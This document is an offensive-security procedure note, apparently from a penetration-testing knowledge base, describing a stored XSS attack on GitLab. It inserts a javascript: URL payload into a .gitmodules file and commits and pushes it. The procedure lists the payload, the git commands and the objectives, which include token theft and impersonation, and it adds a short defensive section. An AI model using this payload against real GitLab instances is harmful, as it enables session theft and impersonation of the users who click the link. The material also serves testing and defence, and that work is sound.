---
id: proc-uuid-3
tags:
  - xss
  - javascript-payload
  - gitmodules-injection
type: procedure
tools:
  - '[[tools/git]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/git-add-all]]'
  - '[[commands/git-commit-message]]'
  - '[[commands/git-push-changes]]'
verified: false
platforms:
  - Web
  - GitLab
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:23.334Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
---

# Inject-JavaScript-Payload-into-Gitmodules-File

## Summary

This procedure modifies the .gitmodules file to insert a javascript: URL payload, enabling stored XSS execution when the submodule directory is viewed in GitLab's Files overview.

## Description

The vulnerability stems from GitLab's failure to validate submodule URLs against javascript: schemes. By editing .gitmodules post-submodule addition, the attacker replaces the relative path with a payload like javascript:alert('XSS'), commits, and pushes. This stores the malicious URL, which executes JS in victims' browsers upon clicking the wiki directory.

## Requirements

1. Existing .gitmodules file from submodule addition
2. Text editor for manual modification
3. Push access to the project

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all URLs in .gitmodules during git push hooks
- Block non-http/git schemes in submodule configurations
- Alert on .gitmodules modifications in security scans

## Objectives

1. Store malicious JavaScript URL without triggering validation
2. Enable execution in victim sessions for token theft
3. Demonstrate impersonation potential via API

## Instructions

### Step 1: Modify .gitmodules File

**Context**: Replace the submodule URL with a JavaScript payload.

No command; manually edit:

> Open .gitmodules and change 'url = ../project.wiki' to 'url = javascript:alert('XSS')'. Save the file.

### Step 2: Stage All Changes

**Context**: Prepare the modified file for commit.

**Command** ([[commands/git-add-all]]):
```bash
git add .
```

> Stages .gitmodules. Expected output: Changes added to index.

### Step 3: Commit and Push

**Context**: Commit the payload and upload to GitLab.

**Command** ([[commands/git-commit-message]]):
```bash
git commit -am "Updated relative URL"
```

**Command** ([[commands/git-push-changes]]):
```bash
git push
```

> Expected output: Commit and push succeed without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/git-add-all]]
- [[commands/git-commit-message]]
- [[commands/git-push-changes]]

## Tools Used

- [[tools/git]]

## Tags

- [[xss]]
- [[javascript-payload]]
- [[gitmodules-injection]]
